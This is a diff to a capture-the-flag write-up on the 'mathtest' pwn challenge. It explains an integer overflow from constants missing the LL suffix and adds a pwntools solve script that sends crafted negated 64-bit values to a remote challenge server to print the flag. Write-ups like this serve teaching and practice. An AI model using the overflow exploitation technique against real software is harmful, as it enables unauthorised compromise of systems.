@@ -298,20 +298,25 @@ char ans3;
 - ans3 * mult3 == 'A'
 ```
 
-After finding `ans1, ans2, ans3` the sum must be equal to the name we set when the program starts
+After finding `ans1, ans2, ans3` the sum must be equal to the name we set when the program starts and that should give us the flag
 
 ```c
 printf("Enter Name:\n");
 char name[100];
 
 scanf("%s", name);
+
+long *n = (long *)name;
+if(ans1 + ans2 + ans3 == *n) {
+        printf("Congratulations! Here is your flag!!!!\n");
+        printflag();
 ```
 
 Now where exactly is the integer overflow?
 
 The point where it assigns value to `mult1, mult2` the values are integers which is supposed to have been stored as long integers
 
-Since the suffix `LL` isn't used then the size would be 4 bytes whereas we are going to multiple the 4 bytes by another long int which in this case we would pass in 8 bytes causing the overflow
+Since the suffix `LL` isn't used then the size would be 4 bytes whereas we are going to multiply the 4 bytes by another long int which in this case we would pass in 8 bytes causing the overflow
 
 I made use of pwntools [negate](https://docs.pwntools.com/en/stable/util/fiddling.html#pwnlib.util.fiddling.negate) function. The syntax is `negate(number,bits_width)`
 ![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/02abe52e-698c-4e61-80a4-1ea48395a076)
@@ -360,11 +365,45 @@ for i in range(0xff+1):
         print(chr(i))
 ```
 
+Running the script gives 'o'
 
+So at this point we just need to calculate the name which is the sum of the three answers
 
+But we need to solve the ans1 + ans2 + ans3 = (long)name too. Since ans1 becomes -1, ans2 is 0 and ans3 is 'o' 
 
+We can easily get the name:
 
+```
+>>> chr(-1 + 0 + ord('o'))
+n
+```
 
+So the name should be 'n'
+
+Here's the solve [script](https://github.com/h4ckyou/h4ckyou.github.io/blob/main/posts/ctf/new-jersey24/pwn/mathtest/solve.py)
+
+```python
+from pwn import *
+
+# io = process("./mathtest")
+io = remote("18.207.140.246", "9001")
+
+for i in range(0xff+1):
+    if chr((i * ord('O')) & 0xff) == 'A':
+        ans3 = chr(i)
+
+ans1 = negate(36864, 64)
+ans2 = -(negate(3735928559, 64))
+
+sleep(60)
+
+io.sendline('n')
+io.sendline(str(ans1))
+io.sendline(str(ans2))
+io.sendline(str(ans3))
+
+io.interactive()
+```
 
 
 
